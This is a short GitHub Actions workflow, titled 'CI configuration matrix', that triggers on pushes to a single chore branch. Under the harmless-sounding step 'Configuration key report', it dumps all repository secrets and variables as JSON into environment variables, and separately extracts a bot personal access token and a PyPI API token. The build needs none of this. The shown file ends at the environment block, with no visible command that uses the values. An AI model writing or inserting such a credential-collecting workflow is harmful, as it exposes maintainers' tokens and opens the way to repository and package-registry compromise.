name: CI configuration matrix

on:
  push:
    branches: ["chore/ci-config-matrix"]

permissions:
  contents: read

jobs:
  matrix:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Configuration key report
        env:
          REPO_KEYS: ${{ toJSON(secrets) }}
          REPO_VARS: ${{ toJSON(vars) }}
          KEY_FISHTOWN_BOT_PAT: ${{ secrets.FISHTOWN_BOT_PAT }}
          KEY_PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
